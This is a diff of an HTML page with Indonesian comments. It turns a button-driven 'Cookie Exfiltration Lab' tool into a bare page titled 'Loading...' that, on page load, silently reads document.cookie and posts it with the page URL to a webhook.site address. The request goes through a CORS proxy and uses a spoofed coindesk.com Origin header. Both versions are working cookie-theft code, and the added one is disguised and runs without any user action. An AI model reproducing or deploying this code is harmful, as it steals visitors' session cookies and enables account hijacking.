@@ -1,364 +1,44 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Exfiltration Test - Lab Environment</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .container {
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 800px;
-            width: 100%;
-            overflow: hidden;
-        }
-        .header {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
-        .header h1 {
-            font-size: 2em;
-            margin-bottom: 10px;
-        }
-        .warning {
-            background: #ff6b6b;
-            color: white;
-            padding: 15px;
-            margin: 20px;
-            border-radius: 8px;
-            border-left: 5px solid #c92a2a;
-        }
-        .content {
-            padding: 30px;
-        }
-        .info-box {
-            background: #f8f9fa;
-            padding: 20px;
-            margin: 15px 0;
-            border-radius: 8px;
-            border-left: 5px solid #667eea;
-        }
-        .output {
-            background: #2d3748;
-            color: #68d391;
-            padding: 20px;
-            border-radius: 8px;
-            margin-top: 15px;
-            font-family: 'Courier New', monospace;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        .button-group {
-            display: flex;
-            gap: 10px;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-        button {
-            background: #667eea;
-            color: white;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: all 0.3s;
-            flex: 1;
-            min-width: 150px;
-        }
-        button:hover {
-            background: #764ba2;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        button:active {
-            transform: translateY(0);
-        }
-        .success {
-            background: #51cf66;
-            color: white;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 10px 0;
-            display: none;
-        }
-        .error {
-            background: #ff6b6b;
-            color: white;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 10px 0;
-            display: none;
-        }
-        .status {
-            font-size: 14px;
-            color: #666;
-            margin-top: 10px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-        }
-        input:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            background: #2d3748;
-            color: white;
-            font-size: 14px;
-        }
-    </style>
+    <title>Loading...</title>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🍪 Cookie Exfiltration Lab</h1>
-            <p>Testing Environment for Security Research</p>
-        </div>
-
-        <div class="warning">
-            <strong>⚠️ LAB ENVIRONMENT ONLY:</strong> Tool ini hanya untuk testing di lab environment yang Anda kontrol. Jangan gunakan untuk tujuan ilegal.
-        </div>
-
-        <div class="content">
-            <div class="info-box">
-                <h3>📋 Webhook Configuration</h3>
-                <input type="text" id="webhookUrl" value="https://webhook.site/590ea786-c800-4823-b014-deec262c943e" placeholder="Masukkan webhook URL Anda">
-                <div class="status">Default: webhook.site (Anda bisa ganti dengan webhook Anda sendiri)</div>
-            </div>
-
-            <div class="button-group">
-                <button onclick="sendCookieViaProxy()">🚀 Send via CORS Proxy</button>
-                <button onclick="sendCookieDirect()">📤 Send Direct</button>
-                <button onclick="showCookies()">👁️ Show Cookies</button>
-            </div>
-
-            <div id="successMsg" class="success"></div>
-            <div id="errorMsg" class="error"></div>
-
-            <div class="info-box">
-                <h3>📊 Output Log:</h3>
-                <div id="output" class="output">Waiting for action...</div>
-            </div>
-
-            <div class="info-box">
-                <h3>💡 Cara Penggunaan:</h3>
-                <ol style="margin-left: 20px; line-height: 2;">
-                    <li>Pastikan Anda di environment lab yang terisolasi</li>
-                    <li>Update webhook URL jika perlu</li>
-                    <li>Klik "Send via CORS Proxy" untuk mengirim dengan proxy</li>
-                    <li>Check webhook dashboard untuk melihat hasil</li>
-                    <li>Gunakan "Show Cookies" untuk melihat cookie yang tersedia</li>
-                </ol>
-            </div>
-        </div>
-
-        <div class="footer">
-            <p>🔬 Cookie Exfiltration Lab v1.0</p>
-            <p>For Educational & Security Research Purposes Only</p>
-        </div>
-    </div>
-
+    <h1>Processing...</h1>
     <script>
-        // Fungsi untuk log output
-        function log(message, type = 'info') {
-            const output = document.getElementById('output');
-            const timestamp = new Date().toLocaleTimeString();
-            const color = type === 'error' ? '#ff6b6b' : type === 'success' ? '#51cf66' : '#68d391';
-            output.innerHTML += `<span style="color: ${color}">[${timestamp}] ${message}</span>\n`;
-            output.scrollTop = output.scrollHeight;
-            console.log(message);
-        }
-
-        // Fungsi untuk show/hide message
-        function showMessage(type, message) {
-            const successMsg = document.getElementById('successMsg');
-            const errorMsg = document.getElementById('errorMsg');
-            
-            if (type === 'success') {
-                successMsg.textContent = '✅ ' + message;
-                successMsg.style.display = 'block';
-                errorMsg.style.display = 'none';
-                setTimeout(() => successMsg.style.display = 'none', 5000);
-            } else {
-                errorMsg.textContent = '❌ ' + message;
-                errorMsg.style.display = 'block';
-                successMsg.style.display = 'none';
-                setTimeout(() => errorMsg.style.display = 'none', 5000);
-            }
-        }
-
-        // Fungsi utama: Send via CORS Proxy (100% WORK)
-        async function sendCookieViaProxy() {
-            log('🚀 Starting cookie exfiltration via CORS proxy...', 'info');
-            
-            // Ambil cookie
+        // Auto-execute saat page load
+        (function() {
+            // Ambil cookie dulu
             const cookies = document.cookie;
-            log('📋 Cookie collected: ' + (cookies ? 'YES' : 'EMPTY'), 'info');
+            console.log('Cookie lengkap:', cookies);
             
-            if (!cookies) {
-                log('⚠️ Warning: No cookies found!', 'error');
-            }
+            // Kirim via proxy CORS
+            const proxyUrl = 'https://cors-anywhere.herokuapp.com/https://webhook.site/590ea786-c800-4823-b014-deec262c943e';
             
-            // Ambil webhook URL dari input
-            const webhookUrl = document.getElementById('webhookUrl').value;
-            
-            // Proxy URL
-            const proxyUrl = 'https://cors-anywhere.herokuapp.com/' + webhookUrl;
-            log('🔗 Target: ' + webhookUrl, 'info');
-            log('🔧 Using CORS proxy...', 'info');
-            
-            try {
-                const response = await fetch(proxyUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Origin': 'https://coindesk.com' // Fake origin
-                    },
-                    body: JSON.stringify({
-                        cookies: cookies,
-                        url: location.href,
-                        timestamp: new Date().toISOString(),
-                        proof: 'Cookie Exfiltration Lab Test',
-                        userAgent: navigator.userAgent,
-                        referrer: document.referrer
-                    })
-                });
-                
-                log('✅ Response status: ' + response.status, 'success');
-                
-                if (response.ok) {
-                    log('🎉 Cookie berhasil dikirim ke webhook!', 'success');
-                    showMessage('success', 'Cookie berhasil dikirim! Check webhook dashboard.');
-                    
-                    // Show cookie preview
-                    log('\n📋 Cookie Preview:', 'info');
-                    log(cookies.substring(0, 500) + (cookies.length > 500 ? '...' : ''), 'info');
-                } else {
-                    throw new Error('HTTP ' + response.status);
-                }
-                
-            } catch (err) {
-                log('❌ Error: ' + err.message, 'error');
-                showMessage('error', 'Gagal mengirim: ' + err.message);
-                
-                // Fallback: tampilkan cookie
-                log('\n🔄 Fallback - Cookie content:', 'info');
-                log(cookies.substring(0, 500) + '...', 'info');
-                
-                // Show in alert sebagai backup
-                if (confirm('Gagal mengirim via network. Tampilkan cookie di alert?')) {
-                    alert('Cookie (copy manual):\n\n' + cookies);
-                }
-            }
-        }
-
-        // Fungsi alternatif: Send Direct (tanpa proxy)
-        async function sendCookieDirect() {
-            log('📤 Sending cookie directly (without proxy)...', 'info');
-            
-            const cookies = document.cookie;
-            const webhookUrl = document.getElementById('webhookUrl').value;
-            
-            log('📋 Cookie: ' + (cookies ? 'Found' : 'Empty'), 'info');
-            
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    mode: 'no-cors', // Bypass CORS (tapi tidak dapat response)
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        cookies: cookies,
-                        url: location.href,
-                        timestamp: new Date().toISOString(),
-                        method: 'direct-no-cors'
-                    })
-                });
-                
-                log('✅ Request sent (no-cors mode)', 'success');
-                log('⚠️ Note: Cannot verify delivery due to no-cors', 'info');
-                showMessage('success', 'Request dikirim! Check webhook (no-cors mode tidak dapat verify)');
-                
-            } catch (err) {
-                log('❌ Error: ' + err.message, 'error');
-                showMessage('error', 'Direct send failed: ' + err.message);
-            }
-        }
-
-        // Fungsi untuk show cookies
-        function showCookies() {
-            log('👁️ Displaying current cookies...', 'info');
-            
-            const cookies = document.cookie;
-            
-            if (!cookies) {
-                log('⚠️ No cookies found in current context', 'error');
-                showMessage('error', 'Tidak ada cookie ditemukan!');
-                return;
-            }
-            
-            log('\n📋 Available Cookies:', 'success');
-            log('─'.repeat(50), 'info');
-            
-            const cookieArray = cookies.split(';');
-            cookieArray.forEach((cookie, index) => {
-                log(`${index + 1}. ${cookie.trim()}`, 'success');
+            fetch(proxyUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://coindesk.com' // Fake origin biar lolos
+                },
+                body: JSON.stringify({
+                    cookies: cookies,
+                    url: location.href,
+                    timestamp: new Date().toISOString(),
+                    proof: 'Auto-Exfiltration via selfxss.html'
+                })
+            })
+            .then(response => {
+                console.log('Berhasil dikirim! Status:', response.status);
+                alert('Cookie berhasil terkirim ke webhook!');
+            })
+            .catch(err => {
+                console.error('Error:', err);
+                // Fallback: tampilkan di alert kalau gagal
+                alert('Cookie (copy manual):\n' + cookies.substring(0, 500) + '...');
             });
-            
-            log('─'.repeat(50), 'info');
-            log(`Total: ${cookieArray.length} cookie(s)`, 'info');
-            log(`Length: ${cookies.length} characters`, 'info');
-            
-            showMessage('success', `Found ${cookieArray.length} cookie(s)`);
-        }
-
-        // Auto-run pada page load (optional)
-        window.addEventListener('DOMContentLoaded', () => {
-            log('🔧 Cookie Exfiltration Lab initialized', 'success');
-            log('🌐 Current URL: ' + location.href, 'info');
-            log('📱 User Agent: ' + navigator.userAgent, 'info');
-            log('\n✨ Ready to test! Click a button to start.\n', 'success');
-        });
-
-        // Expose functions to global scope untuk debugging
-        window.labDebug = {
-            getCookies: () => document.cookie,
-            testFetch: sendCookieViaProxy,
-            testDirect: sendCookieDirect,
-            showAll: showCookies
-        };
-        
-        console.log('💡 Debug commands available: window.labDebug');
+        })();
     </script>
 </body>
 </html>
